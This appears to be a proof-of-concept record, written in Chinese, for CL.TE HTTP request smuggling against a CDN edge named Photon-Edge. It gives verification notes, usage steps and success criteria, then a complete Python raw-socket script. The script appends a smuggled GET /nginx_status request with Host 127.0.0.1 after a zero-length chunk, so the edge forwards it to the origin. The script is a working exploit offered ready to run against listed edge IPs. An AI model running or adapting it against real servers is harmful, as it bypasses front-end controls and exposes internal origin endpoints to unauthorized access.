# 边缘 Photon-Edge CL.TE 请求走私：0-chunk 后追加请求被前端当第二请求转发源站执行

- **code**: photon-edge-clte-desync-smuggle-0chunk-tail-forwarded
- **kind**: poc
- **category**: protocol
- **component**: Photon-Edge（CDN 边缘，Go net/http 语义）+ 源站 nginx/宝塔
- **versions**: 未确定（前端按 Go net/http 处理，TE 优先、忽略 CL）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#609，2026-11-01 08:49~09:20 UTC，本机 Windows + python313 原生 ssl socket 直连三个边缘 IP（192.0.2.8/126/111），SNI+Host 固定 target485.example.com、ALPN 锁 http/1.1。每个 IP 连跑 5 次、5/5 稳定：外带 CL:70 + TE:chunked 的 POST 回 404，0-chunk 后的 GET /nginx_status(Host:127.0.0.1) 被边缘当第二请求转发源站并回 200 text/plain「Active connections: 2 / server accepts handled requests / 4340 4340 16266」，第三条收尾请求正确配对回 200 JSON registration_enabled。CL 取 0/3/5/6/10/13/20/30/65/69/70/80 共 12 种取值结果完全一致（前端忽略 CL）；Host 换 phpmyadmin/panel/localhost 只回外层 404 后连接被丢、8.8.8.8 回 400，走私 OPTIONS 回 403、走私 login 回 429，说明白名单/403/限流仍然生效；h2 对照 RST_STREAM，去 content-length 后走私串只作为 body。脚本 determinism.py / smuggle_v2.py / cl_matrix.py / variants.py / h2_and_paths.py。
- **path**: pocs/photon-edge-clte-desync-smuggle-0chunk-tail-forwarded/photon_edge_clte_smuggle.py
- **tags**: request-smuggling,cl.te,desync,photon-edge,cdn,chunked,nginx-stub-status,raw-socket,h1
- **created_at**: 2026-11-01T09:30:37.708Z
- **engine**: https://target485.example.com（边缘 192.0.2.8 / 192.0.2.5 / 192.0.2.6:443）

## 描述

边缘 Photon-Edge 用 Go net/http 的 transfer 语义：请求同时带 Content-Length 与 Transfer-Encoding: chunked 时按 TE 收体、完全忽略 CL，且把 0-chunk 终止符之后残留的字节当作「同一连接上的第二个前端请求」解析并转发源站。于是攻击者可在 body 尾部塞入任意请求，由边缘代发、由源站执行（本例打到源站宝塔默认站 /nginx_status）。属 CL.TE 类 desync，可用于绕过前端的路由/host 视图、污染后续请求边界；Host 白名单、OPTIONS 403、登录限流仍是源站/边缘共同策略，走私不能绕过它们。仅 h1 成立，h2 下同型报文不成立。

## 用法

```
前置：直连边缘 IP、TLS 握手固定 SNI=真实站点域名（绕开本机 DNS 轮转），一条连接内先发外层请求、再发走私串、最后发一条普通收尾请求，中途不关连接；限速 ≤3 req/s。

判据（三条同时成立）：① 外层请求返回 404（stub 路径不存在）；② 紧接着一条 200 text/plain、正文以 "Active connections:" 开头（源站 127.0.0.1 的 stub_status）；③ 第三条 200 JSON 与收尾请求正确配对（证明没吞后续请求）。
对照：把 CL 改成 0/3/5/10/70/80 结果不变（前端忽略 CL）；三层应答固定为 ['404','200','200']。阴性对照：去掉 CL/TE 的普通请求只有 1 条响应。

失败常见原因：走了本机代理（清 http_proxy/https_proxy 环境变量）；ALPN 协商成 h2（必须锁 http/1.1）；Host 换成边缘不认的 vhost（仅回外层 404 后连接被丢/RST）；中间串把 0-chunk 写成 "0\r\n" 而不是 "0\r\n\r\n"；没发收尾请求导致只看到截断体。
```

## 正文

```
# Photon-Edge CL.TE desync —— 0-chunk 之后的字节被当成新请求转发源站
# 用法: python photon_edge_clte_smuggle.py <edge_ip>[,<edge_ip2>...]
# 说明: 仅 h1(ALPN=http/1.1)；跑前清空 *_proxy 环境变量，避免走本机代理。

import socket, ssl, os, sys, re, time

for k in ("http_proxy","https_proxy","all_proxy","HTTP_PROXY","HTTPS_PROXY","ALL_PROXY"):
    os.environ.pop(k, None)

SNI  = "target485.example.com"          # 换成目标域名：TLS SNI 与 Host 都保持它
PATH = "/api/v1/settings/public"     # 外层请求随便挑一个存在但只回 404 的路径也可
SMUG_PATH = "/nginx_status"          # 走私目标：源站这台 127.0.0.1 的 stub_status

SMUG = ("GET %s HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: x\r\n\r\n" % SMUG_PATH).encode()
FUEL = ("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: x\r\nConnection: keep-alive\r\n\r\n" % (PATH, SNI)).encode()

def outer(cl):
    return ("POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: x\r\n"
            "X-Probe: desync\r\n"
            "Connection: keep-alive\r\n"
            "Content-Length: %d\r\n"
            "Transfer-Encoding: chunked\r\n\r\n" % (PATH, SNI, cl)).encode()

def io(ip, payload, timeout=6.0):
    s = socket.create_connection((ip, 443), timeout=timeout)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])          # 关键：禁止降/升到 h2
    s = ctx.wrap_socket(s, server_hostname=SNI); s.settimeout(timeout)
    s.sendall(payload)
    buf = b""
    while True:
        try: c = s.recv(65536)
        except socket.timeout: break
        if not c: break
        buf += c
        if len(buf) > 2*1024*1024: break
    try: s.close()
    except Exception: pass
    return buf.decode("latin-1", "replace")

def run(ip):
    # 外层 CL 取任意值（前端忽略 CL），0-chunk 终止后紧跟走私请求 + 一条正常收尾请求
    payload = outer(70) + b"0\r\n\r\n" + SMUG + FUEL
    raw = io(ip, payload)
    sts = re.findall(r"HTTP/1\.[01] (\d{3})", raw)
    hit = ("Active connections" in raw) and ("registration_enabled" in raw)
    print(ip, sts, "STUB=Y" if "Active connections" in raw else "STUB=-",
          "FOLLOW-OK" if "registration_enabled" in raw else "FOLLOW=-", "=>", "SMUGGLED" if hit else "no")
    return hit

if __name__ == "__main__":
    ips = sys.argv[1].split(",") if len(sys.argv) > 1 else ["192.0.2.8"]
    total = ok = 0
    for ip in ips:
        for _ in range(5):
            total += 1; ok += run(ip); time.sleep(0.4)
    print("success %d/%d" % (ok, total))

```
